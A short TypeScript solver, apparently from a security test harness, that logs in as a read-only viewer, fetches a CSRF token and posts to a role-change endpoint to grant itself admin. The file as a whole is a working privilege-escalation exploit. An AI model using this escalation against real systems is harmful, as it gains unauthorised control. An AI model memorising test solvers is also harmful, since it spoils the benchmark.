// A read-only auditor session obtains a CSRF token and drives the role endpoint to grant itself the
// admin role, a transition the account's grant level should never permit.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('viewer')

  const csrfRes = await ctx.fetch(ctx.plan.routes.csrf!.path, { method: 'GET' })
  const token = ((await csrfRes.json()) as { csrf?: string }).csrf ?? ''

  const roleField = ctx.plan.params.role ?? 'role'
  const path = ctx.plan.routes.roleChange!.path.replace(/:[A-Za-z0-9_]+/, 'me')
  const body: Record<string, string> = {}
  body[roleField] = 'admin'

  await ctx.fetch(path, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-csrf-token': token },
    body: JSON.stringify(body),
  })
}
